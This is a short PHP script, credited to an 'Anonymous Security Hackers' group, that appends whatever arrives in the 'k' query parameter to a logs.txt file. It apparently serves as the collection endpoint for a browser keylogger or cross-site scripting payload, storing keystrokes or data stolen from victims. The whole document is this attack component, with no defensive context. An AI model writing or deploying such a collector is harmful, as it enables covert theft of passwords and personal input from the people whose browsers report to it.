// Contributed by Kh
// (c)opyright - Anonymous Security Hackers

<?php
 $key=$_GET[ 'k' ];
 $f=fopen( "logs.txt", "a" );
 fwrite( $f, $key );
 fclose( $f );
?>
